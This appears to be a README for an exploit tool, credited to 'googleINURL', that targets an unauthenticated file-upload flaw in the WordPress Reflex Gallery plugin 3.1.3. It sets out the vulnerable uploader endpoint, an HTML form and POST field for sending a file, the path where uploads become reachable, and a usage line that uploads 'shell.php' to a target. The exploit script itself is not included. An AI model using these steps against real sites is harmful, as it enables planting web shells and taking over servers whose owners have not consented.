- Wordpress Plugin Reflex Gallery Arbitrary File Upload / INURL - BRASIL

```
  # AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  # Blog:         http://blog.inurl.com.br
  # Twitter:      https://twitter.com/googleinurl
  # Fanpage:      https://fb.com/InurlBrasil
  # Pastebin      http://pastebin.com/u/Googleinurl
  # GIT:          https://github.com/googleinurl
  # PSS:          http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:      http://youtube.com/c/INURLBrasil
  # PLUS:         http://google.com/+INURLBrasil
```

-   Vulnerability Description
------
WordPress Reflex Gallery plugin version 3.1.3 suffers from a remote shell upload vulnerability.

-   Tool Description
------
The script makes file upload without permission

-   FORM HTML
------
```
<form method = "POST" action = "" enctype = "multipart/form-data" >
<input type = "file" name = "qqfile"><br>
<input type = "submit" name = "Submit" value = "inurl">
</form >
```

-   REQUEST POST SEND
------
```
array('qqfile' => "@_YOU_FILE")
```

-   URL REQUEST SEND
------
```
http://{target}/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2015&Month=03
```

-   URL FILE ACCESS
------
```
http://{target}/wp-content/uploads/2015/03/_YOU_FILE
```

-   EXECUTE EXPLOIT
------
```
Demo: php xpl.php {target} {file}
Ex:   php xpl.php http://target.com shell.php
```

-   OUTPUT VULN
------
filename: Exploit_AFU.txt

- REFERENCE
------
http://packetstormsecurity.com/files/130845/WordPress-Reflex-Gallery-3.1.3-Shell-Upload.html
